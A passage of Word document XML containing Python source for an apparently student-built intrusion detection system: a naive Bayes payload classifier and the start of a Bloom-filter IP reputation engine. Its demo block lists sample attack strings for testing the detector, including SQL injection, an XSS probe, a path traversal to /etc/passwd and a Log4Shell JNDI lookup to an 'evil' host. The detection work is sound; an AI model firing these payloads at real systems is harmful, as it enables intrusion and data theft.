          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AF665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only score words actually present - absence shouldn't push</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49979E0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the verdict toward 'safe' for short payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5896081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word, (p_mal, p_safe) in self.likelihoods.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC2731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word in payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C60D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found.append(word)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFDE0C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log_mal += math.log(p_mal)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A5AF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log_safe += math.log(p_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694C8BF6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38A251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softmax-style normalisation to a 0..1 confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460E527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2E7FBC3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top = max(log_mal, log_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75652B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em = math.exp(log_mal - top)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453FE87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es = math.exp(log_safe - top)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC4E3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confidence = em / (em + es)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5D9A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OverflowError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45014DE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confidence = 1.0 if log_mal &gt; log_safe else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1775A8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="450991D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strong_found = [word for word in found if word not in WEAK_SIGNALS]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2C967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confidence &gt;= self.confidence_threshold and strong_found:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1895E1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"Malicious", confidence, found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F5C5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"Safe", confidence, found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B6D8D6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CA945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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C9519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analyse(self, payload_bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4AFA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 confidence, found = self.classify(payload_bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4977C2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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12784FC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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C99F01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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289D92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detail={"keywords": found, "vocabulary": len(self.likelihoods)},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4014BB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is_threat=(verdict == "Malicious"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7656DF9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DCD8A75" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5145B79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train(self, samples, laplace=1.0, discover=True, top_n=40):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA11D4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"""Fit priors and likelihoods from labelled (payload, label) rows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EC3B0E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EA2460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When `discover` is set, the vocabulary is *learned* from the corpus by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226642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log-odds feature selection instead of relying only on the seeded token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482089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list, which is the principled fix for the low-recall finding: tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234CC1C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that actually separate the two classes in the training data are kept,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B3A6E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so recall is no longer bounded by whatever was hard-coded.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5117703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B38EE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rows = [(str(p), str(l)) for p, l in samples]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2233117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malicious = {"MALICIOUS", "ATTACK"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3165A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n_mal = sum(1 for _, l in rows if l.upper() in malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E16BC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n_safe = len(rows) - n_mal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394C15C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n_mal == 0 or n_safe == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EB97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raise ValueError("payload training set must contain both classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0722FC62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6438F9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vocabulary = set(self.likelihoods)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C831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discover:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3331866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vocabulary |= discover_vocabulary(rows, top_n=top_n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFD132E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40D57A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likelihoods = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C24E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word in vocabulary:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314AF6A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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E5DA5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l.upper() in malicious and word in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F6C5E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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D12F7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l.upper() not in malicious and word in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAEA9E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Laplace smoothing so an unseen token never yields log(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B8845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p_mal = (m + laplace) / (n_mal + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB9E8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p_safe = (s + laplace) / (n_safe + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A23043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likelihoods[word] = (round(p_mal, 6), round(p_safe, 6))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C656C1F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59F1DF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self.likelihoods = likelihoods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1E67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self.prior_malicious = n_mal / len(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6560C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self.prior_safe = 1.0 - self.prior_malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183F7F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print("[NB ] %d payloads (mal=%d safe=%d) prior=%.3f vocab=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571C61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(len(rows), n_mal, n_safe, self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C9A5C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len(likelihoods)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E9FC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{"samples": len(rows), "malicious": n_mal, "safe": n_safe,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B77EF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"prior_malicious": self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6324D9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"vocabulary": len(likelihoods)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C3A1F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4728CE6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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038236A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self.likelihoods = dict(DEFAULT_LIKELIHOODS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35788A1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self.prior_malicious = 0.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C55E51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self.prior_safe = 0.90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3641F28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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B010838" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11A51F84" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06B6D64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_tokenise(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F466A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"""Split a payload into candidate tokens (alphanumeric runs, 3+ chars)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B70D0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 current = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FA843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ch in text.upper():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AF8F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ch.isalnum() or ch in "_$":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142E252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current.append(ch)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495491F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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C70F5D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len(current) &gt;= 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24951B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out.append("".join(current))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074D76F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current = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D8A2D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len(current) &gt;= 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEAE6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out.append("".join(current))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0491B8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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65540DAF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="649DE344" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="182488B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discover_vocabulary(rows, top_n=40, min_count=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9E76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"""Select the most class-discriminative tokens by log-odds ratio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763E9783" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A476E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each candidate token the ratio of its frequency in the malicious class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0171C19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to its frequency in the safe class is scored as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041D0DB6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69A3ADA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score = | log( (m + 1) / (s + 1) ) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474996EC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D2FBF9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and the highest scoring tokens are returned. Tokens that appear in both</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD6C8B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classes at similar rates score near zero and are discarded, so the learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E011A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vocabulary contains only features that carry signal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04119AA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2666C2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malicious = {"MALICIOUS", "ATTACK"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5007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mal_counts, safe_counts = {}, {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3EC84B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2696F3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payload, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FB46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seen = set(_tokenise(payload))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDD0CE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target = mal_counts if str(label).upper() in malicious else safe_counts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3444B7B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token in seen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B497B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target[token] = target.get(token, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D145716" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="705DC2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scored = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FD9A1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token in set(mal_counts) | set(safe_counts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370CB8A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 = mal_counts.get(token, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E157C4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 = safe_counts.get(token, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194E32F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m + s &lt; min_count:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680639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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D1E7D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score = abs(math.log((m + 1.0) / (s + 1.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB7EFE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scored.append((score, token))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377B7817" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16BAD7E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scored.sort(reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F9B90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{token for _, token in scored[:top_n]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3CCC10" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A6D5F53" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70EEC10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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126F12A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nb = PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2AD7F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print("seed vocabulary: %d tokens" % len(nb.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AB4B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p in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8A14C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b"GET /index.html HTTP/1.1\r\nHost: google.com",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624D13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b"GET / HTTP/1.1\r\nUser-Agent: curl/8.5.0",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F3031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b"user=admin' UNION SELECT * FROM users --",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C9D25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b"GET /?q=&lt;svg onerror=alert(1)&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3397E0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b"GET /?file=../../../etc/passwd",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6498CA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b"POST /api {'x':'${jndi:ldap://evil/a}'}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549CA3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b"msg=Did you select the right option?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183E344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567502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 c, w = nb.classify(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077A6D9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print("%-9s conf=%6.2f%% %s" % (v, c * 100, w[:4]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECA0A25"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src/engines/bloom.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F42FAB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>191 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD581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hashlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CD1F3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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7233511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zlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BA4CC6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47201FF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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3677575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from engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5E942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except ImportError:  # allow `python engines/bloom.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1667479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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1331F2AD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E379EA0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36CD60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BloomFilter(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000687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"""Probabilistic set membership for IP reputation lookups.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15888E0B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32BE085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False positives are possible, false negatives never. A k-bit test over an</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5329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m-bit array gives O(k) constant-time lookup independent of how many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74661B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addresses the feed holds, which is why a reputation check can sit on the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4C9EE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per-packet hot path without breaching the latency budget (NFR-1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72784C8B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C1D67C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The expected false-positive rate for n inserted items is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F234416" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66F7F7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 ~= (1 - e^(-k*n/m))^k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DBFEF7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FD138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and is reported by `false_positive_rate()` so callers receive a computed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1881A4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estimate rather than a fixed assertion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409E276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E5B271D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59F844F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name = "bloom"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2479E7B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features = ("source_ip",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BAE4E4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63EBEC5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__init__(self, size=1000, hash_count=3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD7E7E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self.size = size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E9731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self.hash_count = hash_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F248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self.bit_array = [0] * size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C8A17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self.items_added = 0        # counts insert calls, for the FP estimate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE85E3B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C73AF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_hashes(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2B8E4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 = str(item).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFD44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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613AE4FA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B6F47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out.append(zlib.crc32(s) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6713FD0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out.append(int(hashlib.md5(s).hexdigest(), 16) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E007D6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="219958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cheap rolling hash so we have a third independent slot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F796E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 = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F64460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ch in s:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E0346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 = (h &lt;&lt; 5) + ch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2847C2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out.append(h % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6400ECE6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
